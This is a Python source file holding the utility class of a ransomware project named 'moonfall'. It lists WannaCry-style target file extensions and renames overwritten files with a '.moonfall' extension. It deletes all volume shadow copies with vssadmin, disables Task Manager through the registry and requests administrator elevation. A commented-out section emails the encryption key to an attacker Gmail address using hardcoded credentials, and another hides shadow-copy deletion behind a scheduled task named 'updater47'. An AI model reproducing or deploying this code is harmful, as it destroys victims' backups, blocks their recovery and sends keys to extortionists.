import os
import sys
import subprocess
import oschmod
import win32api
import ctypes


class Utils:
    """
        Class with a wide variety of useful functionalities as well as other variables.
    """


    # name of the Ransomware
    BRAND_NAME = 'moonfall'
    BRAND_EXT = '.moonfall'


    # mail variables
    SENDER = 'teamcyber541@gmail.com'
    SENDER_PASSWORD = 'new_password100'
    RECEIVER = 'teamcyber5412@gmail.com'
    MAIL_SERVER = 'smtp.gmail.com'
    MAIL_PORT = 587
    KEY_PASSWORD = 'key_FILE_passw0rd!'


    # directories that must avoid from encrypting
    PROTECTED_DIRS = ['Content.IE5',
                      'Temporary Internet Files',
                      'AppData',
                      'Program Files (x86)',
                      'Program Files', 'ProgramData',
                      'Intel',
                      '$\\',
                      'Local Settings',
                      'Windows',
                      'ransomware',
                      'Boot',
                      'System Volume Information']


    # file extensions that must avoid from encrypting
    EXCLUDED_EXT = ['.moonfall',
                    '.dll',
                    '.exe']


    # file extensions that we must encrypt. Same extensions as Wannacry
    TARGET_EXT = ['.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pst', '.ost', '.msg', '.eml', '.vsd', '.vsdx', '.txt', '.csv', '.rtf', '.123', '.wks', '.wk1', '.pdf',
                  '.dwg', '.onetoc2', '.snt', '.jpeg', '.jpg', '.docb', '.docm', '.dot', '.dotm', '.dotx', '.xlsm', '.xlsb', '.xlw', '.xlt', '.xlm', '.xlc', '.xltx', '.xltm', '.pptm', '.pot',
                  '.pps', '.ppsm', '.ppsx', '.ppam', '.potx', '.potm', '.edb', '.hwp', '.602', '.sxi', '.sti', '.sldx', '.sldm', '.vdi', '.vmdk', '.vmx', '.gpg', '.aes', '.ARC', '.PAQ',
                  '.bz2', '.tbk', '.bak', '.tar', '.tgz', '.gz', '.7z', '.rar', '.zip', '.backup', '.iso', '.vcd', '.bmp', '.png', '.gif', '.raw', '.cgm', '.tif', '.tiff', '.nef', '.psd', '.ai',
                  '.svg', '.djvu', '.m4u', '.m3u', '.mid', '.wma', '.flv', '.3g2', '.mkv', '.3gp', '.mp4', '.mov', '.avi', '.asf', '.mpeg', '.vob', '.mpg', '.wmv', '.fla', '.swf', '.wav', '.mp3',
                  '.sh', '.class', '.jar', '.java', '.rb', '.asp', '.php', '.jsp', '.brd', '.sch', '.dch', '.dip', '.pl', '.vb', '.vbs', '.ps1', '.bat', '.cmd', '.js', '.asm', '.h', '.pas', '.cpp',
                  '.c', '.cs', '.suo', '.sln', '.ldf', '.mdf', '.ibd', '.myi', '.myd', '.frm', '.odb', '.dbf', '.db', '.mdb', '.accdb', '.sql', '.sqlitedb', '.sqlite3', '.asc', '.lay6', '.lay',
                  '.mml', '.sxm', '.otg', '.odg', '.uop', '.std', '.sxd', '.otp', '.odp', '.wb2', '.slk', '.dif', '.stc', '.sxc', '.ots', '.ods', '.3dm', '.max', '.3ds', '.uot', '.stw', '.sxw',
                  '.ott', '.odt', '.pem', '.p12', '.csr', '.crt', '.key', '.pfx', '.der']


    DISABLE_TASKMANAGER_KEY_LOCATION = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"


    def get_file_extension(self, full_path):
        """
        :param full_path: path to the file
        :return: extension of the passed file
        """
        return os.path.splitext(full_path)[1]


    def save_data(self, full_path, data, opt='add_ext'):
        if not os.access(full_path, os.W_OK):
            oschmod.set_mode(full_path, "a+rwx,g-w,o-x")
            if not os.access(full_path, os.W_OK):
                raise PermissionError("Write permissions can't be modified")

        with open(full_path, 'wb') as file:
            file.write(data)

        if opt == 'add_ext':
            os.rename(full_path, full_path + self.BRAND_EXT)
        elif opt == 'del_ext':
            os.rename(full_path, full_path[:-len(self.BRAND_EXT)])
        else:
            raise ValueError('Invalid argument at the time of saving data')


    def load_data(self, full_path):
        if not os.access(full_path, os.R_OK):
            oschmod.set_mode(full_path, "a+rwx,g-w,o-x")
            if not os.access(full_path, os.R_OK):
                raise PermissionError("Read permisions can't be modified")

        with open(full_path, 'rb') as file:
            return file.read()


    def is_windows(self):
        return os.name == 'nt'


    def get_local_drives(self):
        return win32api.GetLogicalDriveStrings().split('\000')[:-1]


    def is_admin(self):
        if self.is_windows():
            try:
                return ctypes.windll.shell32.IsUserAnAdmin() == 1
            except:
                traceback.print_exc()
                return False
        else:
            raise Exception("Not running in Windows System")


    def run_as_admin(self, argv=None, debug=False):
        if argv is None:
            raise ValueError("argv is None")

        if hasattr(sys, '_MEIPASS'):
            # Support pyinstaller wrapped program.
            arguments = str(argv[1:])
        else:
            arguments = str(argv)

        executable = str(sys.executable)

        if debug:
            print('Command line: ', executable, arguments)

        ret = ctypes.windll.shell32.ShellExecuteW(
            None, u"runas", executable, arguments, None, 1)

        if int(ret) <= 32:
            raise Exception("Command not executed")


    def delete_shadowcopies(self):
        completed = subprocess.Popen(
            [r'c:\Windows\System32\vssadmin.exe', 'delete', 'shadows', '/all', '/quiet'])
        return completed


    def enable_task_manager(self):
        key_exists = False
        
        # Try to read the key
        try:
            reg = winreg.OpenKeyEx(winreg.HKEY_CURRENT_USER, self.DISABLE_TASKMANAGER_KEY_LOCATION)
            disabled = winreg.QueryValueEx(reg, "DisableTaskMgr")[0]
            winreg.CloseKey(reg)
            key_exists = True
        except:
            pass
            
        # If key exists and is disabled, enable it
        if key_exists and disabled:
            reg = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                  self.DISABLE_TASKMANAGER_KEY_LOCATION,
                                  0,
                                  winreg.KEY_SET_VALUE)
            winreg.SetValueEx(reg, "DisableTaskMgr", 0,  winreg.REG_DWORD, 0x00000000)
            winreg.CloseKey(reg)


    def disable_task_manager(self):
        key_exists = False
        
        # Try to read the key
        try:
            reg = winreg.OpenKeyEx(winreg.HKEY_CURRENT_USER, self.DISABLE_TASKMANAGER_KEY_LOCATION)
            disabled = winreg.QueryValueEx(reg, "DisableTaskMgr")[0]
            winreg.CloseKey(reg)
            key_exists = True
        except:
            pass
        
        # If key doesn't exist, create it and set to disabled
        if not key_exists:
            reg = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
                                  self.DISABLE_TASKMANAGER_KEY_LOCATION)
            winreg.SetValueEx(reg, "DisableTaskMgr", 0,  winreg.REG_DWORD, 0x00000001)
            winreg.CloseKey(reg)
        # If enabled, disable it
        elif key_exists and not disabled:
            reg = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                  self.DISABLE_TASKMANAGER_KEY_LOCATION,
                                  0,
                                  winreg.KEY_SET_VALUE)
            winreg.SetValueEx(reg, "DisableTaskMgr", 0,  winreg.REG_DWORD, 0x00000001)
            winreg.CloseKey(reg)


    # ERASE
    def run_command(self, cmd):
        completed = subprocess.run(
            ["powershell", "-Command", cmd], capture_output=True)
        return completed


"""
    def id_generator(self, size=12, chars=string.ascii_uppercase + string.digits)
        return ''.join(random.choice(chars) for _ in range(size))
    
    def send_mail_message(self, key):
        attack_id = self.id_generator()
        
        date = datetime.datetime.now()
        date = date.strftime("%c")
        
        msg = MIMEMultipart("alternative")
        msg["Subject"] = 'Key of attack with id ' + attack_id + ' at time ' + date
        msg["From"] = self.SENDER
        msg["To"] = self.RECEIVER

        msg.attach(MIMEText('Download the file', 'plain'))
        
        attach_file_name = attack_id + '_key.key'
        with open(attach_file_name, 'wb') as attach_file:
            attach_file.write(key)
        
        payload = MIMEBase('application', 'octate-stream')
        payload.set_payload((attach_file).read())
        encoders.encode_base64(payload)  # encode the attachment

        payload.add_header('Content-Decomposition', 'attachment', filename=attach_file_name)
        msg.attach(payload)

        s = smtplib.SMTP(self.MAIL_SERVER, self.MAIL_PORT)
        s.ehlo()
        s.starttls()
        s.login(self.SENDER, self.SENDER_PASSWORD)
        s.sendmail(self.SENDER, self.RECEIVER, msg.as_string())
        s.quit()
        
	
	#Copypasted from https://github.com/sithis993/Crypter/blob/4b3148912dbe8f68c952b39f0c51c69513fe4af4/Crypter/Crypter/Crypter.py#L115
	def delete_shadow_files(self):
        '''
        @summary: Create, run and delete a scheduled task to delete all file shadow copies from disk
        '''

        vs_deleter = ScheduledTask(
            name="updater47",
            command="vssadmin Delete Shadows /All /Quiet"
        )
        vs_deleter.run_now()
        vs_deleter.cleanup()
"""

# LINKS HERE
# https://www.youtube.com/watch?v=UoMzCyB2IvE
# read this https://www.xataka.com/basics/copias-seguridad-windows-10-sirven-que-tipos-hay-como-se-hacen
# https://techpress.net/volume-shadow-copy-troubleshooting-delete-existing-shadow-copies-on-windows-server-using-command-line-vssadmin-command-examples-use-of-diskshadow-command/
